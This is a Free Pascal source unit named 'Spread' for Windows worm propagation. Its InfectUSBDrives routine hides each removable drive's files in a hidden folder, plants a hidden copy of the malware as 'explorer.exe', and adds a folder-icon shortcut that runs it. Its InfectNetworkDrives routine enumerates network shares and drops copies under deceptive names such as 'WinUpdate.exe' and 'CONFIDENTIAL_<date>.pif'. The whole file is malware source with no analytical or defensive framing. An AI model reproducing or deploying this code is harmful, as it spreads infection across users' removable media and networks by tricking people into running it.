unit Spread;

{$mode objfpc}{$H+}

interface

uses
  Windows, SysUtils, Classes, ShellApi, ShlObj, ComObj, ActiveX;

procedure InfectUSBDrives;
procedure InfectNetworkDrives;
procedure EnumNetworkResources(NetResource: PNetResource; List: TStrings);

implementation

var
  AlreadyTried: TStringList;

const
  DeskAttr = faHidden{%H-} or faSysFile{%H-} or faReadOnly;
  SysAttr  = faHidden{%H-} or faSysFile{%H-};
  MaxResourceCount = 1700;

function GetCloneName(Dir: String): String;
var
  Sum, J: LongInt;
Begin
  Sum:=0;
  For J:=1 to Length(Dir) do Sum += Ord(Dir[J]);
  Result:=IncludeTrailingBackslash(Dir);
  Sum:=(Sum mod 10);
  Case Sum of
    0: Result += 'WinUpdate.exe';
    1: Result += 'New Report.pif';
    2: Result += 'Microsoft Office Upgrade.exe';
    3: Result += 'Launcher.exe';
    4: Result += 'Yesterday.pif';
    5: Result += 'SoftUpgrade.exe';
    6: Result += 'Rocet Updater.exe';
    7: Result += 'CONFIDENTIAL_'+FormatDateTime('dd_mm_yyy', Now)+'.pif';
    8: Result += 'Autosave.pif';
    9: Result += 'Screensaver.scr';
  end;
end;

procedure CreateLink(const PathObj, PathLink, Desc, Param: string);
var
  IObject: IUnknown;
  SLink: IShellLink;
  PFile: IPersistFile;
begin
  CoInitialize(Nil);
  IObject:=CreateComObject(CLSID_ShellLink);
  SLink:=IObject as IShellLink;
  PFile:=IObject as IPersistFile;
  with SLink do
  begin
    SetArguments(PChar(Param));
    SetDescription(PChar(Desc));
    SetPath(PChar(PathObj));
    SetIconLocation('C:\Windows\system32\SHELL32.dll', 7);
  end;
  PFile.Save(PWChar(WideString(PathLink)), FALSE);
  CoUninitialize;
end;

function GetVolumeLabel(DriveChar: Char): string;
var
  NotUsed:     DWORD;
  VolumeFlags: DWORD;
  VolumeInfo:  array[0..MAX_PATH] of Char;
  VolumeSerialNumber: DWORD;
  Buf: array [0..MAX_PATH] of Char;
begin
    GetVolumeInformation(PChar(DriveChar + ':\'),
    Buf, SizeOf(VolumeInfo), @VolumeSerialNumber, NotUsed{%H-},
    VolumeFlags{%H-}, nil, 0);

    SetString(Result, Buf, StrLen(Buf));
end;


function SysCopy(const srcFile, destFile : string) : boolean;
var
  shFOS : TShFileOpStruct;
begin
  ZeroMemory(@shFOS, SizeOf(TShFileOpStruct));
  shFOS.Wnd := 0;
  shFOS.wFunc := FO_MOVE;
  shFOS.pFrom := PChar(srcFile + #0);
  shFOS.pTo := PChar(destFile + #0);
  shFOS.fFlags := FOF_NOCONFIRMMKDIR or FOF_SILENT or FOF_NOCONFIRMATION or FOF_NOERRORUI;
  Result := SHFileOperation(shFOS) = 0;
end;

Procedure InfectUSBDrives;
var
  DriveMap, dMask: DWORD;
  I: Char;
  D, Lbl: String;
  FFile: Text;
Begin
    DriveMap:=GetLogicalDrives;
    dMask:=1;
    For I:='A' to 'Z' do Begin
      if (dMask and DriveMap)<>0 then
        if GetDriveType(PChar(I+':\'))=DRIVE_REMOVABLE then Begin
          Lbl:=GetVolumeLabel(I);
          D:=I+':\'+Lbl;
          if Not(DirectoryExists(D)) then Begin
            {$IFDEF Debug}
            Writeln('Uninfected [',I,'] drive found.');
            {$ENDIF}
            try
              MkDir(D);
            except
            end;
            if DirectoryExists(D) then Begin
              SysCopy(I+':\*.*', D);
              AssignFile(FFile, D+'\desktop.ini');
              Rewrite(FFile);
              Writeln(FFile,'[.ShellClassInfo]');
              Writeln(FFile,'IconResource=C:\Windows\system32\SHELL32.dll,7');
              CloseFile(FFile);
              FileSetAttr(D+'\desktop.ini', DeskAttr);
              CopyFile('Clone.tmp', PChar(D+'\explorer.exe'), False);
              FileSetAttr(D+'\explorer.exe', SysAttr);
              FileSetAttr(D, SysAttr);
              //Create shortcut
              CreateLink(D+'\explorer.exe', I+':\'+Lbl+' ('+I+').lnk', 'Files and Documents', '/open "'+D+'"');
            end;
          end;
          Sleep(2000);
        end;
      dMask:=dMask shl 1;
    end;
end;

procedure EnumNetworkResources(NetResource: PNetResource; List: TStrings);
type
  TNetResourceArray = Array [0..MaxInt div SizeOf(TNetResource) - 1] of TNetResource;
  PNetResourceArray = ^TNetResourceArray;
var
 Count, BufSize, EnumHandle: Cardinal;
 ResHandle, J: Integer;
 NetArray: PNetResourceArray;
begin
  Count:=$FFFFFFFF;
  BufSize:=MaxResourceCount * SizeOf(TNetResource);
  if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource, EnumHandle{%H-}) = NO_ERROR then
  try
    GetMem(NetArray, BufSize);
    ResHandle:=WNetEnumResource(EnumHandle, Count, NetArray, BufSize);
    if ResHandle = NO_ERROR then Begin
      For J:=0 to Count - 1 do Begin
        if NetArray^[J].dwType=RESOURCETYPE_DISK then
          List.Add(NetArray^[J].lpRemoteName);
        EnumNetworkResources(@NetArray^[J], List);
      end;
    end;
  finally
    FreeMem(NetArray, BufSize);
    WNetCloseEnum(EnumHandle);
  end;
end;

function WriteAccess(Path: String): Boolean;
var
  FFile: Text;
  TempFile: String;
  Unique: Word;
Begin
  Unique:=Random(High(Word));
  TempFile:=IncludeTrailingBackslash(Path)+'wchk-'+IntToStr(Unique)+'.tmp';
  try
    AssignFile(FFile, TempFile);
    Rewrite(FFile);
    Writeln(FFile, 'Success.');
    CloseFile(FFile);
    DeleteFile(TempFile);
  except
    Result:=False;
  end;
end;

procedure InfectNetworkDrives;
var
  AList: TStrings;
  J: LongInt;
Begin
  //Writeln('Network spreading started.');
  AList:=TStringList.Create;
  if Not(Assigned(AlreadyTried)) then Begin
    AlreadyTried:=TStringList.Create;
  end;
  EnumNetworkResources(Nil, AList);
  //Writeln('Enumeration complete.');
  For J:=0 to AList.Count - 1 do
  if AlreadyTried.IndexOf(AList.Strings[J])=-1 then Begin
    if WriteAccess(AList.Strings[J]) then Begin
      CopyFile('Clone.tmp', PChar(GetCloneName(AList.Strings[J])), True);
      {$IFDEF Debug}
      Write('[ OK]: ');
      {$ENDIF}
    end {$IFDEF Debug} else Write('[BAD]: ') {$ENDIF} ;
    {$IFDEF Debug}
    Writeln(AList.Strings[J]);
    {$ENDIF}
    AlreadyTried.Add(AList.Strings[J]);
  end;
  AList.Free;
  //Writeln('Network spreding stopped.');
end;

end.

